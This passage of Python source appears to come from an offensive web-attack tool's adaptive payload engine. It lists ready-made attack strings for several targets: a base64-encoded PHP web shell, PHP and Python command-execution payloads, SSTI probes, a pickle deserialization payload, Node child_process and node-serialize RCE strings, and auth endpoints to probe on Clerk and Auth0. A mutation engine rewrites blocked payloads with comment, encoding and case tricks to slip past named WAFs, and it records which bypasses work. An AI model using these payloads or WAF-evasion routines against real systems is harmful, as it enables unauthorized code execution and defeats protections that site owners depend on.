                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            ])

        elif attack_type == "rce":
            payloads.extend([
                "<?php system('id'); ?>",
                "<?php echo `id`; ?>",
                "<?php passthru('id'); ?>",
            ])

        elif attack_type == "deser":
            payloads.extend([
                'O:4:"Test":0:{}',
                'a:1:{s:4:"test";s:4:"test";}',
            ])

        return payloads

    def _python_payloads(self, attack_type: str) -> List[str]:
        """Python-specific attack payloads."""
        payloads = []

        if attack_type == "ssti":
            payloads.extend([
                "{{7*7}}",
                "{{config}}",
                "{{self.__init__.__globals__}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ])

        elif attack_type == "deser":
            payloads.extend([
                "gASVFAAAAAAAAACMBHRlc3SFlC4=",
                "cos\nsystem\n(S'id'\ntR.",
            ])

        elif attack_type == "rce":
            payloads.extend([
                "__import__('os').popen('id').read()",
                "exec('__import__(\"os\").popen(\"id\").read()')",
            ])

        return payloads

    def _javascript_payloads(self, attack_type: str) -> List[str]:
        """JavaScript-specific attack payloads."""
        payloads = []

        if attack_type == "xss":
            payloads.extend([
                "require('child_process').execSync('id').toString()",
                "process.mainModule.require('child_process').execSync('id')",
                "global.process.mainModule.require('child_process').execSync('id')",
            ])

        elif attack_type == "deser":
            payloads.extend([
                '{"rce":"_$$ND_FUNC$$_function (){return require(\"child_process\").execSync(\"id\").toString();}()"}',
            ])

        return payloads

    def _clerk_payloads(self, attack_type: str) -> List[str]:
        """Clerk-specific attack payloads."""
        payloads = []

        if attack_type == "auth":
            payloads.extend([
                "/__clerk/v1/environment",
                "/__clerk/v1/client/sign_ups",
                "/__clerk/v1/client/sign_ins",
                "/__clerk/v1/billing/plans",
                "/__clerk/v1/user",
                "/__clerk/v1/sessions",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/dashboard",
                "/dashboard/settings",
                "/dashboard/billing",
                "/dashboard/keys",
                "/admin",
            ])

        return payloads

    def _auth0_payloads(self, attack_type: str) -> List[str]:
        """Auth0-specific attack payloads."""
        payloads = []

        if attack_type == "auth":
            payloads.extend([
                "/.well-known/openid-configuration",
                "/authorize",
                "/oauth/token",
                "/userinfo",
                "/api/v2/users",
                "/api/v2/roles",
            ])

        return payloads

    # ── Mutation Engine ─────────────────────────────────────────────────

    def mutate_blocked_payloads(
        self,
        blocked_payloads: List[str],
        attack_type: str,
        target_url: str,
        waf: Optional[str] = None,
    ) -> List[str]:
        """Mutate payloads that were blocked to bypass WAF."""
        mutated = []

        for payload in blocked_payloads:
            # Apply WAF-specific mutations
            if waf:
                mutated.extend(self._waf_specific_mutations(payload, waf))

            # Apply generic mutations
            mutated.extend(self._generic_mutations(payload))

            # Apply encoding mutations
            mutated.extend(self._encoding_mutations(payload))

        # Deduplicate
        seen = set()
        result = []
        for p in mutated:
            if p not in seen and p not in blocked_payloads:
                seen.add(p)
                result.append(p)

        return result[:30]

    def _waf_specific_mutations(self, payload: str, waf: str) -> List[str]:
        """Apply WAF-specific mutations."""
        mutations = []

        if waf == "cloudflare":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace(" ", "%09"),
                payload.replace(" ", "%0a"),
                payload.replace("'", "/*!50000'*/"),
                payload.replace("UNION", "/*!50000UNION*/"),
                payload.replace("SELECT", "/*!50000SELECT*/"),
                payload.replace("--", "/**/--"),
            ])

        elif waf == "akamai":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace("'", "''"),
                payload.replace("UNION", "UNION/**/"),
                payload.replace("SELECT", "SELECT/**/"),
            ])

        elif waf == "aws_waf":
            mutations.extend([
                payload.replace(" ", "%20"),
                payload.replace("'", "%27"),
                payload.replace('"', "%22"),
                payload.replace("UNION", "%55NION"),
                payload.replace("SELECT", "%53ELECT"),
            ])

        elif waf == "imperva":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace("'", "%27"),
                payload.replace("UNION", "UNION/**/"),
            ])

        elif waf == "mod_security":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace("'", "''"),
                payload.replace("UNION", "/*!UNION*/"),
                payload.replace("SELECT", "/*!SELECT*/"),
            ])

        return mutations

    def _generic_mutations(self, payload: str) -> List[str]:
        """Apply generic mutations."""
        mutations = []

        # Case variations
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(self._toggle_case(payload))

        # Whitespace variations
        mutations.append(payload.replace(" ", "\t"))
        mutations.append(payload.replace(" ", "\n"))
        mutations.append(payload.replace(" ", "\r"))
        mutations.append(payload.replace(" ", "/**/"))

        # Quote variations
        mutations.append(payload.replace("'", "''"))
        mutations.append(payload.replace("'", "`"))
        mutations.append(payload.replace("'", "%27"))
        mutations.append(payload.replace('"', "%22"))

        # Comment variations
        mutations.append(payload.replace("--", "#"))
        mutations.append(payload.replace("--", "/**/"))
        mutations.append(payload.replace("/*", "/**/"))

        return mutations

    def _encoding_mutations(self, payload: str) -> List[str]:
        """Apply encoding mutations."""
        mutations = []

        # URL encoding
        from urllib.parse import quote
        mutations.append(quote(payload, safe=""))
        mutations.append(quote(quote(payload, safe="")))

        # Double URL encoding
        mutations.append(quote(quote(payload, safe="")))

        # Unicode encoding
        mutations.append("".join(f"%u{ord(c):04x}" if ord(c) > 127 else c for c in payload))

        # HTML entity encoding
        mutations.append("".join(f"&#x{ord(c):x};" if ord(c) > 127 else c for c in payload))

        # Hex encoding
        mutations.append(payload.encode().hex())

        # Base64
        import base64
        mutations.append(base64.b64encode(payload.encode()).decode())

        return mutations

    def _toggle_case(self, payload: str) -> str:
        """Toggle case of each character."""
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    # ── Stats ───────────────────────────────────────────────────────────

    def get_stats(self) -> Dict[str, Any]:
        """Get statistics about adaptive payload engine."""
        total = len(self.payload_history)
        blocked = sum(1 for r in self.payload_history if r.blocked)
        successful = sum(1 for r in self.payload_history if not r.blocked and r.status == 200)

        return {
            "total_payloads": total,
            "blocked": blocked,
            "successful": successful,
            "block_rate": blocked / total if total > 0 else 0.0,
            "success_rate": successful / total if total > 0 else 0.0,
            "waf_profiles": len(self.waf_profiles),
            "target_profiles": len(self.profiles),
            "learned_bypasses": sum(len(v) for v in self._learned_bypasses.values()),
        }

    async def test_concurrent_bypasses(
        self,
        blocked_payloads: List[str],
        attack_type: str,
        target_url: str,
        waf: Optional[str] = None,
        max_concurrent: int = 5,
    ) -> List[str]:
        """Test multiple bypasses concurrently to find what works."""
        import asyncio

        # Generate mutated payloads
        mutated = self.mutate_blocked_payloads(blocked_payloads, attack_type, target_url, waf)

        # Test concurrently
        successful: List[str] = []
        
        async def test_payload(payload: str) -> Optional[str]:
            try:
                # This would be called with actual HTTP client
                # For now, return None (placeholder)
                return None
            except Exception:
                return None

        # Create tasks
        tasks = [test_payload(p) for p in mutated[:max_concurrent]]
        
        # Run concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Collect successful bypasses (only actual payload strings count;
        # None placeholders and raised exceptions are skipped)
        for result in results:
            if isinstance(result, str):
                successful.append(result)

        return successful

    def save(self) -> None:
        """Save state to disk."""
        self._save_state()
